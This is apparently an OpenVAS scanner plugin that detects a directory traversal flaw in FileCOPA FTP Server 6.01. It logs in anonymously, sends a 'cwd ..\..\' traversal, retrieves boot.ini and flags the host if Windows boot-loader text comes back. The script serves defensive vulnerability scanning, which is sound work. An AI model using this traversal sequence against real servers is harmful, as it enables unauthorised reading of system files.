###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_filecopa_ftp_server_dir_trav_vun.nasl 8495 2018-01-23 07:57:49Z teissa $
#
# FileCOPA FTP Server Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to read arbitrary files
  on the affected application.
  Impact Level: Application";
tag_affected = "FileCOPA FTP Server version 6.01";
tag_insight = "The flaw is due to an error while handling certain requests
  which can be exploited to download arbitrary files from the host system.";
tag_solution = "Upgrade to FileCOPA FTP Server 6.01.01 or later,
  For updates refer to http://www.filecopa-ftpserver.com/";
tag_summary = "The host is running FileCOPA ftp Server and is prone to directory traversal
  vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801539");
  script_version("$Revision: 8495 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-23 08:57:49 +0100 (Tue, 23 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-11-16 10:37:01 +0100 (Tue, 16 Nov 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_name("FileCOPA FTP Server Multiple Directory Traversal Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42161");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15450/");
  script_xref(name : "URL" , value : "http://h0wl.baywords.com/2010/11/08/filecopa-ftp-server-6-01-directory-traversal/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("220-InterVations FileCOPA FTP Server" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

# Check for the user name and password
domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
  domain = this_host_name();
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user and passwrd
if(!user){
  user = "anonymous";
}

if(!pass){
  pass = string("SecPod@", domain);
}

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  ## Get the passive port
  pasvPort = ftp_get_pasv_port(socket:soc1);
  if(pasvPort)
  {
    ## open tcp socket on passive port
    soc2 = open_sock_tcp(pasvPort, transport:get_port_transport(ftpPort));
    if(soc2)
    {
      ## check the current working directory
      send(socket:soc1, data:'cwd ..\\..\\\r\n');
      result1 = ftp_recv_line(socket:soc1);

      ##  Get the required file
      send(socket:soc1, data:'retr boot.ini\r\n');
      result = ftp_recv_data(socket:soc2);

      ## check for contents of file afer exploit
      if("[boot loader]" >< result && "\WINDOWS" >< result){
        security_message(ftpPort);
      }
    }

   close(soc2);
   ftp_close(socket:soc1);
  }
}
